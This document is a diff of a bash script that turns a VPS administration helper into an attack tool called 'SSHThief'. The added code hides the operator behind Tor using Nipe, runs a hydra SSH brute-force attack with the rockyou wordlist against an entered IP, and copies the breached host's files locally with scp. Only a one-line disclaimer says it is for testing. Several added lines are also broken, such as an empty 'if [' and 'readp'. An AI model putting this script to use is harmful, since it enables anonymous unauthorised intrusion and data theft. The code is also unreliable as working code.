@@ -1,292 +1,213 @@
 #!/bin/bash
 
-###############################
-### SSHThief FUNCTIONS
-###############################
+#######################
+### SSHTHIEF FUNCTIONS
+#######################
 
 # INSTALL(): automatically installs relevant applications on user host and creates relevant directories
-# ANON(): executes Nipe anonymiser and conducts and anonymity check
-# CRACK(): collects user input for VPS address and executes a hydra brute-force attack
+# ANON(): executes Nipe anonymiser and conducts an anonymity check
+# SSHCRACK(): collects user input for VPS address and executes a hydra brute-force attack
 # SCP(): access VPS, and secure copy (scp) all the directories and files from the VPS onto the local host
 
-# 1. once executed, automatically install relevant applications
-# 2. automatically activate nipe and conduct an anonymity check
-# 3. once the check is passed, capture credentials for VPS as input and remotely access VPS
-# 4. arrive at menu with alphabetical options
-# 5. use alpbetical options to remotely conduct whois query or nmap scan
-# 6. return to menu after a whois query or nmapscan for convenience
-# 6. generate output reports and have the option to export them to local computer
+#####################
+### INSTALL FUNCTION
+#####################
 
- 
- 
- 
- 
- 
-### LOCALINSTALL FUNCTION
+### DEFINITION
 
-# let the user know that remote control is starting
-echo " "
-echo "VPS REMOTE CONTROL is starting..."
-echo " "
-
-# define localinstall function
-function localinstall()
+function INSTALL()
 {
-	# let the user know applications are being installed and that some time will be spent waiting
+	### START
+	# let the user know that SSHThief is starting
 	echo " "
-	echo "Installing applications on your local computer..."
+	echo "[*] SSHThief is starting..."
+	echo " "
+	echo "[*] Installing and updating applications on your local computer..."
+	echo " "
+	echo "[*] Creating new directory: ~/SSHThief..."
 	echo " "
 	
-	# update and install latest APT packages
+	### APT UPDATE
+	# update APT packages
 	sudo apt-get update
 	sudo apt-get upgrade
 	sudo apt-get dist-upgrade
 	
-	# navigate to home directory and create a directory for this script, to contain the output files later on
+	### DIRECTORY
+	# create a directory to contain output files later
 	cd ~
-	mkdir VRC
-	cd ~/VRC	
+	mkdir SSHThief
+	cd ~/SSHThief
+	echo "[+] Directory created: ~/SSHThief"
+	echo " "
 	
+  	### FIGLET INSTALLATION
 	# install figlet for aesthetic purposes
-	# make a directory for downloading figlet font
-	mkdir figresources
-	cd ~/VRC/figresources
-	# install cybermedium figlet font; credits: http://www.figlet.org/fontdb_example.cgi?font=cybermedium.flf
-	sudo apt-get install figlet
+	mkdir figrc
+	cd ~/SSHThief/figrc
+	sudo apt-get -y install figlet
+	# install cybermedium figlet font; credits: http://www.figlet.org
 	wget http://www.jave.de/figlet/fonts/details/cybermedium.flf
+	cd ~/SSHThief
 	
-	# install relevant applications for the whois query and nmap scans
-	sudo apt-get install whois
-	sudo apt-get install nmap
-	
-	# make a directory to download whois and nmap outputs later
-	cd ~/VRC
-	mkdir whois-reports
-	mkdir nmap-reports
-	
-	# install xsltproc for converting nmap output to html
-	sudo apt-get install -y xsltproc
-
-	# install relevant applications for the vps access
-	sudo apt-get install ssh
-	sudo apt-get install sshpass
-	
-	# install relevant applications for anonymity check
-	cd ~/VRC
+	### CORE APPLICATIONS INSTALLATION
+	# install relevant applications
+	sudo apt-get -y install wordlists
+	sudo apt-get -y install ssh
+	sudo apt-get -y install sshpass
+	sudo apt-get -y install hydra
 	sudo apt-get install tor
 	git clone https://github.com/htrgouvea/nipe.git 
-	cd ~/VRC/nipe 
+	cd ~/SSHThief/nipe 
 	sudo cpan install Try:Tiny Config::Simple JSON
 	sudo perl nipe.pl install
 	
+	### END
 	# let the user know applications are installed
 	echo " "
-	echo "Applications installed and up to date."
+	echo "[+] Applications installed and updated."
 	echo "	"
 }
 
-# call the localinstall function
-localinstall
+### EXECUTION
+INSTALL
 
+########
+### SCP
+########
 
-
-
-
-### ANONCHECK-VPSACCESS FUNCTION
-
-# define anoncheck function
-function anoncheck()
+### DEFINITION
+function SCP()
 {
+	### START
+	echo " "
+	echo "[+] Connected to $vpsip."
+	echo " "
+	echo "[*] Copying target file system..."
+	echo " "
+	# create directory to store file system
+	cd ~/SSHThief/$vpsip
+	mkdir ~/SSHThief/$vpsip/system
+	cd ~/SSHThief/$vpsip/system
+	
+	### ACCESS AND COPY
+	sshpass -p "$vpspass" scp "$vpsuser"@"$vpsip":~/* ~/SSHThief/$vpsip/system 2> /dev/null
+	echo " "
+	echo "[+] Target file system has been copied onto the directory: ~/SSHThief/$vpsip/system"
+	
+	### END
+	exit
+}
+
+#############
+### SSHCRACK
+#############
+
+### DEFINITION
+function SSHCRACK()
+{
+	### START
+	# display figlet for aesthetics, with short description of program
+	figlet -c -f ~/SSHThief/figrc/cybermedium.flf -t "SSHTHIEF"
+	echo " "
+	echo "[*] This program is for testing the basic network security of a VPS. Please use for penetration testing and education purposes only."
+	echo " "
+	echo "[!] Press Ctrl-C to exit."
+	echo " "
+	
+	### VPS ADDRESS INPUT
+	read -p "[!] Enter VPS IP Address: " vpsip
+	cd ~/SSHThief
+	mkdir $vpsip
+	cd ~/SSHThief/$vpsip
+	echo " "
+	echo "[+] Directory created: ~/SSHThief/$vpsip"
+	echo " "
+	
+	# WORDLIST CONFIGURATION
+	echo "[*] Configuring Wordlists..."
+	cd ~/SSHThief/$vpsip
+	mkdir wordlist
+	cd ~/usr/share/wordlists
+	sudo gunzip rockyou.txt
+	sudo cat rockyou.txt > wordlist.txt
+	sudo sed -i '1i root' wordlist.txt
+	sudo mv wordlist.txt ~/SSHThief/$vpsip/wordlist
+	cd ~/SSHThief/$vpsip/wordlist
+	WordList = ~/SSHThief/$vpsip/wordlist/wordlist.txt
+	echo "[+] Wordlist created: ~/SSHThief/$vpsip/wordlist/wordlist.txt"
+	echo " "
+	cd ~/SSHThief
+	
+	### BRUTE-FORCE ATTACK
+	echo "[*] Executing Hydra Brute-Force Attack via SSH protocol..."  
+	echo " "
+	sudo hydra -L $WordList -P $WordList $vpsip ssh -vV > crackedusers.txt
+	# if attack succeeds, select cracked user and call the SCP function
+	if [
+		### DISPLAY OF CRACKED USERS
+		# let user know about the number and details of cracked users to choose from
+		echo "[+] Attack successful:"
+		echo "[+] $(cat crackedusers.txt | grep host: | wc -l) Cracked Users: (Format: <username> <password>)"
+		echo "$(cat crackedusers.txt | grep host: | awk '{print $5, $7}')"
+		echo " "
+		
+		### SELECTION OF CRACKED USER
+		read -p "[!] Enter the cracked user you want to access as:" $vpsuser
+		echo " "
+		readp -p "[!] Enter the password of the cracked user: " $vpspass
+		echo " "
+		echo "[*] Connecting to $vpsip now..."
+		# execute SCP function
+		SCP
+	else
+		### EXIT
+		echo "[-] Attack unsuccessful. Exiting program now..."
+		exit
+	fi
+}
+
+#########
+### ANON
+#########
+
+### DEFINITION
+function ANON()
+{
+	### START
 	# let the user know anonymity check is starting
 	echo " "
-	echo "Conducting Anonymity Check..."
+	echo "[*] Conducting Anonymity Check..."
 	echo " "
 	
-	# navigate to nipe folder
-	cd ~/VRC/nipe
-	# execute nipe 
+	### ANONYMISATION
+	# execute nipe in nipe folder
+	cd ~/SSHThief/nipe
 	sudo perl nipe.pl start
-	#c heck status of nipe
-	sudo perl nipe.pl status
 	
+	### ANONYMITY CHECK
+	sudo perl nipe.pl status
 	# if nipestatus shows "activated", user is anonymous
-	nipestatus=$(sudo perl nipe.pl status | grep activated | awk '{print $3}' | awk -F. '{print $1}')
+	nipestatus = $(sudo perl nipe.pl status | grep activated | awk '{print $3}' | awk -F. '{print $1}')
 	if [ "$nipestatus" == "activated" ]
 	then
 		# tell user that he is anonymous
 		echo " "
-		echo "ANONYMITY CHECK: You are currently anonymous."
+		echo "[+] ANONYMITY CHECK: You are currently anonymous."
 		echo " "
-		# after anonymity check, call the vpsaccess function
-		vpsaccess
+		# after anonymity check, call the SSHCRACK function
+		SSHCRACK
 	else
 		# tell user that he is not anonymous, and exit script
 		echo " "
-		echo "ANONYMITY CHECK: You are currently not anonymous."
+		echo "[-] ANONYMITY CHECK: You are currently not anonymous."
 		echo " "
-		echo "Error in activating nipe. Exiting now..."
+		echo "[-] Error in activating nipe. Exiting now..."
 		echo " "
 		exit
 	fi	
 }
 
-# define vpsaccess function that is called within anoncheck function
-function vpsaccess()
-{
-	# capture credentials of VPS 
-	echo "Enter IP Address of VPS"
-	read vpsip
-	echo " "
-	echo "Enter Username of VPS"
-	read vpsuser
-	echo " "
-	echo "Enter Password of VPS"
-	read vpspass
-}
+# EXECUTION
+ANON
 
-# call the anoncheck function, which also contains the vpsaccess function within
-anoncheck
-
-
-
-
-
-### REMOTEINSTALL FUNCTION
-
-# define remoteinstall function
-function remoteinstall()
-{
-	# let user know he is connected to the VPS
-	echo " "
-	echo "Connected to VPS."
-	echo " "
-	# let the user know applications are being installed and that some time will be spent waiting
-	echo " "
-	echo "Installing applications on VPS..."
-	echo " "
-	
-	# update and install latest APT packages
-	sudo apt-get update
-	sudo apt-get upgrade
-	sudo apt-get dist-upgrade
-	
-	# navigate to home directory and create a directory for this script, to contain the output files later on
-	cd ~
-	mkdir VRC
-	cd ~/VRC	
-	
-	# install figlet for aesthetic purposes
-	# make a directory for downloading figlet font
-	mkdir figresources
-	cd ~/VRC/figresources
-	
-	# install cybermedium figlet font; credits: http://www.figlet.org/fontdb_example.cgi?font=cybermedium.flf
-	sudo apt-get install figlet
-	wget http://www.jave.de/figlet/fonts/details/cybermedium.flf
-	
-	# install relevant applications for the whois query and nmap scans
-	sudo apt-get install whois
-	sudo apt-get install nmap
-	
-	# make a directory to download whois and nmap outputs later
-	cd ~/VRC
-	mkdir whois-reports
-	mkdir nmap-reports
-	
-	# install xsltproc for converting nmap output to html
-	sudo apt-get install -y xsltproc
-
-	# install relevant applications for the vps access
-	sudo apt-get install ssh
-	sudo apt-get install sshpass
-	
-	# let the user know applications are installed
-	echo " "
-	echo "Applications installed and up to date."
-	echo "	"
-}
-
-# call the remoteinstall function over ssh to install the applications on the accessed VPS
-# declare then call the function within the remote ssh command
-# credit: Ushakov Vasilii, last post on https://stackoverflow.com/questions/22107610/shell-script-run-function-from-script-over-ssh
-# let the user know that he is connecting to the VPS
-echo " "
-echo "Connecting to $vpsip..."
-echo " "
-sshpass -p "$vpspass" ssh "$vpsuser"@"$vpsip" "$(declare -f remoteinstall);remoteinstall" 2> /dev/null
-
-
-
-
-
-### MENU FUNCTION
-
-# define menu function 
-function menu()
-{
-	# read options for remote control
-	read -p "Select an option (A/B/C):
-	
-	A) Whois Query
-	B) Nmap Scan
-	C) Export Reports (Exit)
-		
-	" Options
-}
-
-# do a while true loop to return to the menu after an option, until exit
-# got this from CFC/ThinkCyber coursebook, Linux Fundamentals, page 49
-while true 
-do
-# display figlet for aesthetics
-figlet -c -f ~/VRC/figresources/cybermedium.flf -t "VPS REMOTE CONTROL"
-# call menu function
-menu
-
-# define remote control options
-case $Options in
-		
-# A. WHOIS QUERY
-# conduct a whois query and output to the whois-reports directory 
-A) sshpass -p "$vpspass" ssh "$vpsuser"@"$vpsip" "whois $vpsip > ~/VRC/whois-reports/whois-report.txt"
-# let user know that the whois query is done
-echo " "
-echo "Whois query is done."
-echo " "
-echo "Your report is ready for export."
-echo " "
-;;
-		
-# B. NMAP SCAN
-# conduct an nmap scan and output to the nmap-reports directory
-B) sshpass -p "$vpspass" ssh "$vpsuser"@"$vpsip" "sudo nmap -oX ~/VRC/nmap-reports/nmap-report.xml $vpsip"
-# convert to html for readability
-sshpass -p "$vpspass" ssh "$vpsuser"@"$vpsip" "xsltproc ~/VRC/nmap-reports/nmap-report.xml -o ~/VRC/nmap-reports/nmap-report.html"
-# let user know that the nmap scan is done
-echo " "
-echo "Nmap scan is done."
-echo " "
-echo "Your report is ready for export."
-echo " "
-;;		
-
-# C. EXPORT 
-# remotely copy all generated reports onto local computer before exiting
-# let user know the above
-C) echo " "
-echo "Exporting all generated reports from VPS onto local computer..."
-echo " "
-sshpass -p "$vpspass" scp "$vpsuser"@"$vpsip":~/VRC/whois-reports/whois-report.txt ~/VRC/whois-reports 2> /dev/null
-sshpass -p "$vpspass" scp "$vpsuser"@"$vpsip":~/VRC/nmap-reports/nmap-report.html ~/VRC/nmap-reports 2> /dev/null
-# let user know that the exporting is done"
-echo " "
-echo "The latest whois report has been exported to the directory: ~/VRC/whois-reports."
-echo " "
-echo "The latest nmap report has been exported to the directory: ~/VRC/nmap-reports."
-echo " "
-exit
-;;
-
-esac
-
-done
